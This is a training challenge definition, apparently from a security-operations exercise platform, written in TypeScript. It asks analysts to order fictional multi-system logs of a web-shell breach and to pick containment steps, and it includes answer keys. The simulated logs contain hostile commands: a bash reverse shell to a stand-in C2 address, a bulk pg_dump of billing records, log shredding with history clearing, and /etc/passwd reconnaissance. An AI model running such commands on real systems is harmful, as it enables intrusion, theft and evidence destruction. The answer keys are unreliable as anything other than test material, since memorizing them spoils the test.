// ============================================================
// Challenge: cc-so-03 — Incident Response Timeline
// Room: Security Operations | Difficulty: Advanced
//
// Scenario:
//   At 18:15 UTC, the SOC received high-severity alerts indicating active
//   data exfiltration and anti-forensics log shredding on the public customer
//   tracking cluster (tracking.veridian-logistics.example).
//   The analyst must correlate 11 multi-system log entries presented in
//   ingestion order, reconstruct the attack chain chronologically, identify
//   the most likely initial access vector, and select the safest, most
//   proportionate containment and evidence preservation response.
//
// All domains use RFC 2606 .example TLDs.
// All IPs use RFC 5737 documentation addresses or RFC 1918 private subnets.
// All personas, servers, and organizations are entirely fictional.
// ============================================================

import type { Challenge } from '../../types';

export const challengeCC_SO_03: Challenge = {
  id: 'cc-so-03',
  roomId: 'secops',
  difficulty: 'advanced',
  title: 'Incident Response Timeline',
  briefing:
    'At 18:15 UTC, the SOC received high-severity alerts indicating active data exfiltration and log tampering on the public customer tracking portal (tracking.veridian-logistics.example). You have collected 11 multi-system log artifacts from edge WAF, host EDR, network firewalls, Active Directory, and database servers. The ingested telemetry is currently unsorted. Correlate the timestamps and event details across systems, reconstruct the attack chain in chronological order, determine the most likely initial access vector, and decide on the critical containment and preservation response.',

  // ── Evidence ──────────────────────────────────────────────────────────────
  evidence: [
    {
      id: 'ev-unsorted-logs',
      type: 'log',
      label: 'Multi-System Telemetry Dossier (11 Events)',
      content: {
        isTimeline: true,
        timelineTitle: 'Multi-Source Security Event Ingestion Queue',
        timelineSubtitle:
          'Ingestion Status: 11 Unsorted Pipeline Records (Scope: tracking.veridian-logistics.example & Core Tier)',
        subjectAccount: 'Incident Ref: INC-2026-9041 (Customer Portal Breach)',
        timeRange: '29 Sep 2026, 14:00 – 18:15 UTC (Ingestion Arrival Order)',
        events: [
          {
            id: 'log-01',
            timestamp: '16:48:50 UTC',
            system: 'db-prod-01 (PostgreSQL Server)',
            eventType: 'database.auth.success',
            status: 'warning',
            title: 'Administrative PostgreSQL Session Established from Web Tier',
            description:
              'Database session opened from web application server app-srv-02 (10.0.4.15) authenticating as svc-db-sync.',
            sourceIp: '10.0.4.15',
            location: 'Internal Subnet 10.0.2.80 (Database Tier)',
            rawPayload:
              'POSTGRES: connection authorized: user=svc-db-sync database=veridian_logistics host=10.0.4.15 port=49122 ssl=on',
          },
          {
            id: 'log-02',
            timestamp: '14:22:30 UTC',
            system: 'app-srv-02 (Nginx Web Server)',
            eventType: 'http.request.upload',
            status: 'alert',
            title: 'Unauthenticated Document Upload with Double Extension',
            description:
              'HTTP POST request to /api/v1/document-upload saving invoice_spec.pdf.phtml (Status: 201 Created). Stored in web-accessible /var/www/uploads/.',
            sourceIp: '198.51.100.45',
            location: 'External WAN (Client ASN 64512)',
            rawPayload:
              'NGINX_ACCESS: 198.51.100.45 - - [29/Sep/2026:14:22:30 +0000] "POST /api/v1/document-upload HTTP/1.1" 201 412 "-" "python-requests/2.31.0" dest="/var/www/uploads/invoice_spec.pdf.phtml"',
          },
          {
            id: 'log-03',
            timestamp: '17:42:15 UTC',
            system: 'fw-core-01 (Perimeter Firewall / DLP Egress)',
            eventType: 'network.flow.egress',
            status: 'alert',
            title: 'High-Volume Encrypted Outbound Data Stream (14.2 GB)',
            description:
              'Sustained outbound TLS stream from web server app-srv-02 (10.0.4.15) to external drop server 203.0.113.99:8443.',
            sourceIp: '10.0.4.15',
            location: 'Egress Interface eth0 -> 203.0.113.99:8443',
            rawPayload:
              'FLOW_LOG: proto=TCP src=10.0.4.15:52110 dst=203.0.113.99:8443 bytes_sent=15246840320 duration=380s action=ALLOW rule=DEFAULT_EGRESS_TLS',
          },
          {
            id: 'log-04',
            timestamp: '14:05:12 UTC',
            system: 'waf-edge-01 (Edge Reverse Proxy / WAF)',
            eventType: 'waf.rule.probe',
            status: 'warning',
            title: 'External Automated Directory and API Endpoint Scan',
            description:
              'Repetitive HTTP GET probes against /api/v1/shipments/ and administrative endpoints from scanner IP 198.51.100.45.',
            sourceIp: '198.51.100.45',
            location: 'Edge POP (Dublin, IE)',
            rawPayload:
              'WAF_RULE_MATCH: Rule=SCANNER_BURST_PROBE | IP=198.51.100.45 | Hits=420 | URIs=[/api/v1/admin, /tracking/upload, /api/v1/document-upload] | Action=LOG_ONLY',
          },
          {
            id: 'log-05',
            timestamp: '15:02:44 UTC',
            system: 'app-srv-02 (Linux Host EDR / Auditd)',
            eventType: 'process.privilege_escalation',
            status: 'alert',
            title: 'Privilege Escalation to Root via SUID pkexec Binary',
            description:
              'Process www-data invoked vulnerable SUID binary /usr/bin/pkexec, spawning an interactive root shell /bin/bash (UID 0).',
            sourceIp: '10.0.4.15',
            location: 'Host: app-srv-02.internal',
            rawPayload:
              'AUDITD: type=EXECVE msg=audit(1759158164.120:942): argc=1 a0="/usr/bin/pkexec" euid=0 ruid=33(www-data) comm="bash" exe="/bin/bash"',
          },
          {
            id: 'log-06',
            timestamp: '17:15:30 UTC',
            system: 'db-prod-01 (PostgreSQL Server EDR)',
            eventType: 'process.database_dump',
            status: 'alert',
            title: 'Bulk Database Dump Archive Created (14.2 GB)',
            description:
              'Command pg_dump executed on customer_billing_records table, archiving compressed archive to /tmp/dump.tar.gz.',
            sourceIp: '10.0.2.80',
            location: 'Host: db-prod-01.internal',
            rawPayload:
              'PROCESS_CREATE: pid=49184 ppid=49122 cmd="pg_dump -U svc-db-sync -d veridian_logistics -t customer_billing_records -F c -f /tmp/dump.tar.gz" size=14.2GB',
          },
          {
            id: 'log-07',
            timestamp: '14:23:05 UTC',
            system: 'app-srv-02 (Linux Host EDR / Auditd)',
            eventType: 'process.c2_connection',
            status: 'alert',
            title: 'Interactive Reverse Shell Spawned to External C2 Server',
            description:
              'Web server process www-data executed /bin/sh invoking bash reverse TCP shell connecting outbound to 203.0.113.88:443.',
            sourceIp: '10.0.4.15',
            location: 'Host: app-srv-02.internal -> External 203.0.113.88:443',
            rawPayload:
              'AUDITD: type=EXECVE msg=audit(1759155785.441:812): argc=4 a0="bash" a1="-i" a2=">&" a3="/dev/tcp/203.0.113.88/443" euid=33(www-data)',
          },
          {
            id: 'log-08',
            timestamp: '15:35:10 UTC',
            system: 'fw-core-01 (Internal Network Firewall)',
            eventType: 'network.recon.port_scan',
            status: 'warning',
            title: 'Internal Network Reconnaissance Sweep from DMZ Web Server',
            description:
              'Host app-srv-02 (10.0.4.15) performed SYN sweep targeting internal database subnet (10.0.2.0/24) on ports 445, 389, and 5432.',
            sourceIp: '10.0.4.15',
            location: 'DMZ Subnet (10.0.4.0/24) -> Core Subnet (10.0.2.0/24)',
            rawPayload:
              'FIREWALL_ALERT: event=PORT_SCAN_INTERNAL src=10.0.4.15 dst=10.0.2.0/24 proto=TCP ports=[445,389,5432] state=BLOCKED_PARTIAL',
          },
          {
            id: 'log-09',
            timestamp: '18:05:00 UTC',
            system: 'app-srv-02 (Linux Host EDR / Auditd)',
            eventType: 'anti_forensics.log_tampering',
            status: 'alert',
            title: 'Anti-Forensics: Web Server Access Logs Shredded and History Cleared',
            description:
              'Root session executed secure file deletion utility shred against web server access logs and cleared bash shell history.',
            sourceIp: '10.0.4.15',
            location: 'Host: app-srv-02.internal',
            rawPayload:
              'AUDITD: type=EXECVE msg=audit(1759161900.021:1088): cmd="shred -u -z /var/log/nginx/access.log && history -c" euid=0(root)',
          },
          {
            id: 'log-10',
            timestamp: '14:41:18 UTC',
            system: 'app-srv-02 (Linux Host EDR / Auditd)',
            eventType: 'process.discovery',
            status: 'warning',
            title: 'Local Host Discovery and Reconnaissance Commands',
            description:
              'Execution sequence of whoami, id, uname -a, and cat /etc/passwd by www-data via reverse shell.',
            sourceIp: '10.0.4.15',
            location: 'Host: app-srv-02.internal',
            rawPayload:
              'AUDITD: type=EXECVE seq_cmds=["whoami", "id", "uname -a", "cat /etc/passwd"] ppid=812(bash) user=www-data',
          },
          {
            id: 'log-11',
            timestamp: '16:12:02 UTC',
            system: 'dc-01.corp.veridian-logistics.example (Active Directory KDC)',
            eventType: 'auth.kerberos.tgs_request',
            status: 'alert',
            title: 'Kerberos TGS Request Burst (Kerberoasting Pattern)',
            description:
              '45 Kerberos TGS ticket requests with weak legacy RC4 cipher encryption submitted by app-srv-02 targeting service account svc-db-sync.',
            sourceIp: '10.0.4.15',
            location: 'Core Infrastructure (DC-01)',
            rawPayload:
              'EVENT_ID_4769: ServiceName=svc-db-sync TicketOptions=0x40810000 TicketEncryptionType=0x17(RC4-HMAC) ClientIP=10.0.4.15 Status=0x0',
          },
        ],
      },
    },
    {
      id: 'ev-incident-briefing',
      type: 'policy',
      label: 'Incident Handling & Timeline SOP Reference',
      content: {
        type: 'directory',
        company: 'Veridian Logistics — SOC Incident Response Standards',
        employee: {
          name: 'Incident Commander Desk',
          title: 'Tier-3 Cyber Incident Response Team (CIRT)',
          department: 'Security Operations & Threat Defense',
          officialEmail: 'cirt-leads@veridian-logistics.example',
          internalPhone: '+353 1 496 0999 (CIRT Hot Bridge)',
          officeLocation: 'Global SOC Operations Center',
          assistant: 'SOC Dispatch Ext. 9110',
          currentStatus: 'Active Incident Response Mode: Severity P1 Security Incident (INC-2026-9041)',
        },
        policy: {
          code: 'SOP IR-302',
          title: 'Advanced Incident Response, Attack Chain Reconstruction & Containment Protocol',
          rules: [
            'Principle 1 (Chronological Reconstruction): Multi-system telemetry is ingested asynchronously with varying queue delays. Analysts must correlate canonical event timestamps to establish the true attack lifecycle: Initial Foothold -> Execution / C2 -> Privilege Escalation -> Lateral Movement -> Staging / Collection -> Exfiltration -> Anti-Forensics.',
            'Principle 2 (Distinguish Foothold from Lateral Steps): Initial access marks the first boundary crossing from external unauthenticated requests to internal code execution. Do not confuse secondary lateral actions (such as internal Kerberoasting or database logins) with the root entry vector.',
            'Principle 3 (Preservation Before Destruction): Volatile memory (RAM), network connections, process trees, and temporary directories contain vital perishable forensic evidence. Never reboot, power-off, or re-image a live compromised host before volatile state is acquired.',
            'Principle 4 (Proportionate Containment): Isolate compromised endpoints at the network perimeter (quarantine VLAN or host drop rules) and sever active C2 sockets. Do not rely solely on external IP blocks while leaving root-level persistence active on internal servers.',
            'Principle 5 (Fact vs Inference Discipline): State initial access mechanisms based on corroborated telemetry (e.g. web upload status codes and subsequent process spawns), but do not claim attribution or unverified vulnerabilities as absolute facts without proof.',
          ],
        },
      },
    },
  ],

  // ── Steps ─────────────────────────────────────────────────────────────────
  //
  // Step 1 (40 pts): Chronological ordering of 6 critical incident phases (ordering, partial credit)
  // Step 2 (30 pts): Identify most likely initial access vector (single-choice, no partial)
  // Step 3 (30 pts): Choose proportionate containment & preservation action (single-choice, no partial)
  //
  // Total: 100 pts. Pass threshold: 70.
  steps: [
    {
      id: 'step-order-events',
      prompt:
        'Inspect the timestamps and evidence in the multi-system telemetry dossier. Reconstruct the chronological sequence of the attack by placing the following 6 key incident milestones in order from earliest (1) to latest (6).',
      interaction: 'ordering',
      partialCreditAllowed: true,
      pointValue: 40,
      // Items initially presented out of order (derangement: 0 items in correct position)
      items: [
        {
          id: 'phase-lateral-recon',
          label:
            'Internal network SYN scan from web server targeting database subnet 10.0.2.0/24 (15:35 UTC)',
        },
        {
          id: 'phase-exfiltration',
          label:
            'High-volume encrypted outbound file transfer (14.2 GB) streamed to drop server 203.0.113.99 (17:42 UTC)',
        },
        {
          id: 'phase-exploit-upload',
          label:
            'Arbitrary file upload exploit uploaded executable web shell invoice_spec.pdf.phtml (14:22 UTC)',
        },
        {
          id: 'phase-c2-shell',
          label:
            'Interactive reverse TCP shell established from www-data to external C2 203.0.113.88:443 (14:23 UTC)',
        },
        {
          id: 'phase-priv-esc',
          label:
            'Local privilege escalation via SUID pkexec spawned root shell with UID 0 (15:02 UTC)',
        },
        {
          id: 'phase-db-dump',
          label:
            'Bulk database dump (pg_dump) archived customer billing records to /tmp/dump.tar.gz (17:15 UTC)',
        },
      ],
      answerKey: {
        order: [
          'phase-exploit-upload',
          'phase-c2-shell',
          'phase-priv-esc',
          'phase-lateral-recon',
          'phase-db-dump',
          'phase-exfiltration',
        ],
      },
    },
    {
      id: 'step-initial-access',
      prompt:
        'Based on the multi-system logs and reconstructed timeline, what is the most likely initial access vector used by the adversary to establish their initial foothold on the corporate network?',
      interaction: 'single-choice',
      partialCreditAllowed: false,
      pointValue: 30,
      items: [
        {
          id: 'opt-file-upload',
          label:
            'Exploitation of an unauthenticated arbitrary file upload vulnerability in /api/v1/document-upload allowing the adversary to plant an executable web shell (invoice_spec.pdf.phtml) in a web-accessible directory.',
        },
        {
          id: 'opt-kerberoasting',
          label:
            'Kerberoasting attack directly against Active Directory domain controller dc-01 to crack service account passwords offline.',
        },
        {
          id: 'opt-sql-injection',
          label:
            'Direct external SQL injection attack executed against production database server db-prod-01 over the public Internet.',
        },
        {
          id: 'opt-credential-phishing',
          label:
            'Spear-phishing email targeting database administrators to harvest corporate portal credentials.',
        },
      ],
      answerKey: { chosen: 'opt-file-upload' },
    },
    {
      id: 'step-containment',
      prompt:
        'With an active root-level breach on the public web server, lateral database compromise, and ongoing exfiltration/anti-forensics, what is the safest and most proportionate immediate containment and evidence preservation procedure according to SOP IR-302?',
      interaction: 'single-choice',
      partialCreditAllowed: false,
      pointValue: 30,
      items: [
        {
          id: 'opt-contain-preserve',
          label:
            'Immediately isolate app-srv-02 at the network perimeter (quarantine VLAN or host egress drop rule), terminate active C2 socket connections to 203.0.113.88 and 203.0.113.99, capture live volatile memory (RAM) dumps on app-srv-02 and db-prod-01 prior to power cycling, revoke compromised database credentials (svc-db-sync), and preserve system and WAF logs before further shredding occurs.',
        },
        {
          id: 'opt-reboot-wipe',
          label:
            'Immediately power-cycle and hard-reboot both app-srv-02 and db-prod-01, wipe both servers, and re-deploy from last week\'s backup images.',
        },
        {
          id: 'opt-block-ip-only',
          label:
            'Add firewall drop rules for external IPs 203.0.113.88 and 203.0.113.99 at the perimeter border router and continue monitoring the web server without isolating the host.',
        },
        {
          id: 'opt-patch-only',
          label:
            'Apply an emergency software patch to /api/v1/document-upload on the live server, restart Nginx, and email customer support.',
        },
      ],
      answerKey: { chosen: 'opt-contain-preserve' },
    },
  ],

  // ── Hints ─────────────────────────────────────────────────────────────────
  hints: [
    'Inspect the timestamps across all log sources. External probing and unauthenticated file uploads precede local process creation and reverse shell initiation by only a few seconds.',
    'Distinguish initial entry from lateral progression: Kerberoasting (16:12 UTC) and database access (16:48 UTC) originated from app-srv-02 hours after the web server itself was compromised.',
    'Evidence preservation must always precede destruction. Rebooting or wiping systems erases volatile RAM, injected process trees, and temporary staging artifacts essential for scope determination.',
  ],

  // ── Skills ────────────────────────────────────────────────────────────────
  skills: [
    'incident-timeline-reconstruction',
    'multi-source-log-correlation',
    'initial-access-analysis',
    'attack-chain-mapping',
    'incident-containment-and-preservation',
  ],

  // ── Scoring ───────────────────────────────────────────────────────────────
  passThreshold: 70,

  // ── Explanations ─────────────────────────────────────────────────────────
  successExplanation:
    'Exceptional incident response analysis! You correctly parsed the multi-system telemetry, reconstructed the exact chronological lifecycle of the attack, identified the file upload vulnerability as the initial entry vector, and selected the proper containment and evidence preservation procedure.\n\nChronological Attack Lifecycle:\n1. 14:05:12 UTC: External reconnaissance scan by 198.51.100.45 probing upload endpoints.\n2. 14:22:30 UTC: Arbitrary file upload exploit via /api/v1/document-upload planting invoice_spec.pdf.phtml (201 Created).\n3. 14:23:05 UTC: Web shell executed by www-data, establishing an interactive reverse TCP shell to C2 server 203.0.113.88:443.\n4. 14:41:18 UTC: Local discovery commands (whoami, id, uname, /etc/passwd).\n5. 15:02:44 UTC: Privilege escalation exploiting SUID pkexec to obtain root (UID 0).\n6. 15:35:10 UTC: Internal network reconnaissance scanning core database subnet 10.0.2.0/24.\n7. 16:12:02 UTC: Kerberoasting TGS request burst targeting service account svc-db-sync.\n8. 16:48:50 UTC: Lateral database session established using cracked svc-db-sync credentials.\n9. 17:15:30 UTC: Mass database dump (pg_dump) creating 14.2 GB archive /tmp/dump.tar.gz.\n10. 17:42:15 UTC: Outbound exfiltration transfer streaming 14.2 GB to drop server 203.0.113.99:8443.\n11. 18:05:00 UTC: Anti-forensics log shredding attempt (shred -u -z /var/log/nginx/access.log).\n\nInitial Access Analysis:\nWhile Kerberoasting and database dumping occurred later, the initial foothold was established via unauthenticated file upload at 14:22 UTC. Web application vulnerability was the root cause.\n\nContainment & Preservation Protocol:\nNetwork isolation (quarantine) severs adversary control without destroying volatile RAM artifacts or unwritten system logs. Live memory capture on both app-srv-02 and db-prod-01 is critical before power cycling, and compromised service credentials must be revoked immediately.',

  failureExplanation:
    'Incident timeline reconstruction requires careful correlation of timestamps across heterogeneous log sources and adherence to forensic evidence preservation standards.\n\nKey Investigation Takeaways:\n- Attack Chronology:\n  • Initial Access: 14:22 UTC file upload exploit (invoice_spec.pdf.phtml).\n  • Foothold / C2: 14:23 UTC reverse shell to 203.0.113.88:443.\n  • Privilege Escalation: 15:02 UTC pkexec exploit spawning root shell.\n  • Lateral Movement: 15:35 UTC internal subnet scan followed by 16:12 UTC Kerberoasting.\n  • Impact / Exfiltration: 17:15 UTC database dump followed by 17:42 UTC exfiltration of 14.2 GB to 203.0.113.99.\n- Identifying Initial Access: Kerberoasting and database queries occurred internally from app-srv-02 hours after the web shell was planted. The entry point was the unauthenticated web file upload.\n- Containment Discipline: Never reboot or wipe compromised servers during an active investigation, as volatile memory (RAM) and network state are lost forever. Isolate the hosts on the network, sever C2 connections, dump memory, rotate credentials, and preserve logs.',

  shuffleItems: false,
};
